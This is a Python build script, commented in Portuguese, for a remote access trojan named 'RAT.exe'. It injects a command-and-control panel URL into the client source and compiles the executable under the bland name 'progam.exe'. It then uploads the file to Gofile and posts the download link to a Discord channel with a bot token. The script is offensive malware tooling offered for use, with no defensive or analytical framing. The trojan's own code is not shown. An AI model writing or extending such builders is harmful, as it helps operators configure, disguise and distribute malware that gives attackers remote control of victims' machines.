#!/usr/bin/env python3
"""
Compilador simplificado do RAT.exe - sem mostrar prints/comandos
Execute: python compile_rat.py
"""

import sys
import os
import asyncio
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from builder2 import BuilderV2

CHANNEL_ID = 1513378963727187968
TOKEN = os.environ.get('DISCORD_TOKEN', '')


async def upload_to_gofile(file_path):
    """Upload exe to Gofile, return download link"""
    import requests
    try:
        with open(file_path, 'rb') as f:
            r = requests.post('https://store1.gofile.io/uploadFile',
                            files={'file': f}, timeout=180)
        data = r.json()
        if data.get('status') == 'ok':
            return data['data']['downloadPage']
    except Exception as e:
        print(f"[GOFILE] Erro upload: {e}")
    return None


async def send_to_discord(file_path):
    import discord
    intents = discord.Intents.default()
    intents.message_content = True

    class SendClient(discord.Client):
        async def on_ready(self):
            try:
                channel = self.get_channel(CHANNEL_ID)
                if channel is None:
                    channel = await self.fetch_channel(CHANNEL_ID)

                file_size = os.path.getsize(file_path) / (1024 * 1024)
                
                # Upload to Gofile first
                gofile_link = await upload_to_gofile(file_path)
                
                msg = (
                    f"**Novo RAT.exe compilado!**\n"
                    f"Tamanho: {file_size:.1f} MB\n"
                )
                if gofile_link:
                    msg += f"Download: {gofile_link}"
                else:
                    msg += f"Caminho: `{file_path}`"
                
                await channel.send(msg)
                print(f"[DISCORD] Link enviado para o canal!")
            except Exception as e:
                print(f"[DISCORD] Erro: {e}")
            finally:
                await self.close()

    client = SendClient(intents=intents)
    try:
        await client.start(TOKEN)
    except Exception as e:
        print(f"[DISCORD] Erro ao conectar bot: {e}")


if __name__ == "__main__":
    import shutil
    
    # Inject panel URL into central_client before build
    panel_url = os.environ.get('PANEL_URL', '')
    central_py = Path(__file__).parent / 'central_client.py'
    backup_py = Path(__file__).parent / 'central_client.py.bak'
    
    if panel_url and central_py.exists():
        shutil.copy2(central_py, backup_py)
        with open(central_py, 'r', encoding='utf-8') as f:
            code = f.read()
        code = code.replace(
            "os.environ.get('PANEL_URL', 'http://localhost:5000')",
            f"'{panel_url}'"
        )
        with open(central_py, 'w', encoding='utf-8') as f:
            f.write(code)
        print(f"[BUILD] Panel URL injetada: {panel_url}")
    
    builder = BuilderV2()
    success = builder.main()
    
    # Restore original central_client.py
    if backup_py.exists():
        shutil.copy2(backup_py, central_py)
        backup_py.unlink()
    
    if success:
        exe_path = builder.dist_dir / builder.output_name
        print("\n" + "="*80)
        print(" COMPILACAO CONCLUIDA COM SUCESSO!")
        print(f" progam.exe pronto em: {exe_path}")
        print("="*80 + "\n")

        print("[DISCORD] Enviando progam.exe para o Discord...")
        asyncio.run(send_to_discord(str(exe_path)))

        sys.exit(0)
    else:
        print("\n" + "="*80)
        print(" ERRO NA COMPILACAO")
        print("="*80 + "\n")
        sys.exit(1)
